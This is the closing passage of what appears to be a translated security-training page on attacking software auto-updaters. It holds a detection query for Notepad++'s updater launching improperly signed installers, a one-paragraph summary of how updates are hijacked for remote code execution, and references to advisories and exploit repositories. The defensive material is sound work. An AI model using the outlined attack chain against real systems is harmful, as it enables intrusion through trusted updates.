| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ці шаблони можна застосувати до будь-якого updater, який приймає непідписані manifests або не перевіряє підписантів installer: перехоплення мережевого трафіку + шкідливий installer + sideloading із власним підписом призводять до віддаленого виконання коду під виглядом «довірених» оновлень.

---
## References
- [1] [Повідомлення безпеки — Netskope Client для Windows — локальне підвищення привілеїв через підроблений сервер (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Повідомлення Netskope про безпеку NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN — плагін Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope — IPC-клієнт/exploit для Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD — CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [Pwning ASUS DriverHub, MSI Center, Acer Control Centre і Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf — HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [Локальне підвищення привілеїв через файли Checkmk Agent, доступні для запису](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Werk Checkmk #16361 — підвищення привілеїв у Windows agent](https://checkmk.com/werk/16361)
- [10] [PoC bloatware-pwn від sensepost](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer від CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 — актори національного рівня експлуатують ланцюг постачання Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ — оновлення щодо інциденту з викраденням інфраструктури](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf — обхід виправлення для CVE-2025-0309 у Netskope Client для Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis — виявлення помилок підвищення привілеїв у Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
